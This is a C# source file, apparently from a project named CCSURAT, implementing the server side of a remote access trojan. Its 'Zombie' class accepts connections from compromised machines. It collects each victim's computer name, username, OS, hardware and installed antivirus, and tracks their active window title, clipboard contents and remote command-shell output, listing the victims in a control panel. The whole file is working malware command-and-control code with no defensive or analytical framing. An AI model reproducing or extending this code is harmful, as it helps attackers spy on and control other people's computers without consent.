using System;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CCSURAT_Server
{
    public class Zombie
    {
        // Store a copy of the main form for logging
        // also store the listview to add clients to it.
        private ServerMainForm mainForm;
        private ListView zombieListView;
        private ZombieListItem zombieItem;

        private TcpClient client;
        private NetworkStream netStream;

        #region Information
        public string IP, clientVersion, computerName, username, OS, CPU, RAM, AV, currentWindow, clipboard, CMDData;
        private string status, curData;
        private Boolean active;
        #endregion
        public Zombie(ServerMainForm form, TcpClient client)
        {
            this.mainForm = form;
            this.zombieListView = mainForm.zombieListView;
            this.client = client;
            this.netStream = client.GetStream();
            this.active = true;
            this.SendData("[[START]][[/START]]");
            Console.Beep();
        }
        public void ListenForData()
        {
            try
            {
                while (IsAlive() && IsActive())
                {
                    if (netStream.DataAvailable)
                    {
                        byte[] bytes = new byte[1024];
                        string data = null;
                        int i;
                        if ((i = netStream.Read(bytes, 0, bytes.Length)) != 0)
                        {
                            // convert recieved bytes to string data
                            data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                            curData += data;
                            Log("Data recieved: " + data);

                            // Handles the first command. Will need to make it loop through each command and handle it.
                            // That will require some sort of client ID to be transferred per command.
                            if (FirstCommandIsClosed(curData))
                            {
                                HandleData(FirstCommand());
                            }
                        }
                        Application.DoEvents();
                    }
                    // Need to test this sleep, see if it messes up communication.
                    // Using this due to high CPU usage on server.
                    //Thread.Sleep(100);
                }
            }
            catch (Exception ex)
            {
                Log("Stream lost connection: " + ex.Message);
            }
            finally
            {
                Log("Lost connection to: " + IP);
                active = false;
                // remove entry from listview if connection is lost/closed
                RemoveFromListView();
                mainForm.UpdateStatus();
            }
        }

        // checks if connection is still alive with client.
        private Boolean IsAlive()
        {
            try
            {
                // write empty buffer to client to check if connection is alive
                byte[] empty = new byte[10];
                netStream.Write(empty, 0, 0);
                return true;
            }
            catch (SocketException ex)
            {
                // Send buffer is full, but still connected to client.
                if (ex.NativeErrorCode.Equals(10035))
                    return true;
                else
                {
                    Log("CLIENT DEAD");
                    return false;
                }
            }
        }

        // Handle data received from clients.
        private void HandleData(string data)
        {
            if (IsActive())
            {
                try
                {
                    // Seperate the command and data
                    string command = GetCommand(data);
                    data = RemoveCommand(data);

                    switch (command)
                    {
                        case "START":
                            ParseSystemInfo(data);
                            AddToListView();
                            break;
                        case "STATUS":
                            status = data;
                            break;
                        case "ACTIVEWINDOW":
                            currentWindow = data;
                            UpdateActiveWindow();
                            break;
                        case "CLIPBOARD":
                            clipboard = data;
                            break;
                        case "CMD":
                            CMDData = data;
                            break;
                    }
                }
                catch (Exception ex)
                {
                    // Data without proper command tag was received.
                    Log("Could not handle data: " + data);
                }
            }
        }

        // Gets command tag
        private string GetCommand(string text)
        {
            text = text.Substring(2, text.IndexOf("]") - 2);
            return text;
        }

        // Removes command tag from data
        private string RemoveCommand(string data)
        {
            data = data.Substring(data.IndexOf("]]") + 2);
            data = data.Substring(0, data.LastIndexOf("[") - 1);
            return data;
        }

        // Checks if first command in data is closed.
        private bool FirstCommandIsClosed(string data)
        {
            string openCommandTag = data.Substring(0, data.IndexOf("]") + 2);
            openCommandTag = data.Substring(2, openCommandTag.Length - 4);
            string closeCommandTag = "[[/" + openCommandTag + "]]";
            return data.Contains(closeCommandTag);
        }

        // Gets the first command in data.
        private string FirstCommand()
        {
            string openCommandTag = curData.Substring(0, curData.IndexOf("]") + 2);
            openCommandTag = curData.Substring(2, openCommandTag.Length - 4);
            string closeCommandTag = "[[/" + openCommandTag + "]]";
            string temp = curData.Substring(0, curData.IndexOf(closeCommandTag) + closeCommandTag.Length);
            curData = curData.Substring(temp.Length);
            return temp;
        }

        // write data to client
        public void SendData(string s)
        {
            try {
                // convert string data to byte array and write it to the stream
                byte[] data = System.Text.Encoding.ASCII.GetBytes(s);
                netStream.Write(data, 0, data.Length);
                Log("Data sent: " + s);
            } catch(Exception ex)
            {
                Log("Error sending data: " + ex.ToString());
            }
        }

        private void AddToListView()
        {
            // handle cross-thread call.
            if (zombieListView.InvokeRequired)
            {
                zombieListView.Invoke(new Action(AddToListView));
                return;
            }

            // add stored client information to listview.
            zombieItem = new ZombieListItem(this);
            zombieItem.Text = IP;
            // Will need to add a check if client version is older than server version. 
            // If that's the case, then update client or at least mark as outdated.
            zombieItem.SubItems.Add(clientVersion); // subitem #1
            zombieItem.SubItems.Add(computerName);
            zombieItem.SubItems.Add(username);
            zombieItem.SubItems.Add(OS);
            zombieItem.SubItems.Add(CPU);
            zombieItem.SubItems.Add(RAM);
            zombieItem.SubItems.Add(AV);
            zombieItem.SubItems.Add(currentWindow); // subitem #8

            zombieListView.Items.Add(zombieItem);
        }

        private void UpdateActiveWindow()
        {
                if (zombieListView.InvokeRequired)
                {
                    zombieListView.Invoke(new Action(UpdateActiveWindow));
                    return;
                }
            try {
                zombieItem.SubItems[8].Text = currentWindow;
            } catch(Exception ex)
            {

            }
        }

        private void RemoveFromListView()
        {
            if (zombieListView.InvokeRequired)
            {
                zombieListView.Invoke(new Action(RemoveFromListView));
                return;
            }
            //zombieListView.Items.Remove(this.zombieItem);
            mainForm.zombies.Remove(this);
            zombieItem.ForeColor = Color.Gray;
        }

        // Parse the data and set the client's system info
        private void ParseSystemInfo(string data)
        {
            // The IP is taken serverside by using the first part of RemoteEndPoint
            // which is the endpoint of the socket connection.
            try {
                EndPoint temp = client.Client.RemoteEndPoint;
                IP = temp.ToString().Substring(0, temp.ToString().IndexOf(":"));
            }catch(Exception)
            {
                IP = "Unknown";
            }

            // The rest of the information is what was sent by the client.
            // Each piece of system info is seperated by: |*|
            string[] info = data.Split("|*|".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
            clientVersion = info[0];
            computerName = info[1];
            username = info[2];
            OS = info[3];
            CPU = info[4];
            RAM = info[5];
            AV = info[6];
            currentWindow = info[7];
        }

        public Boolean IsActive()
        {
            return active;
        }

        private void Log(string s)
        {
            mainForm.Log(s);
        }
    }
}
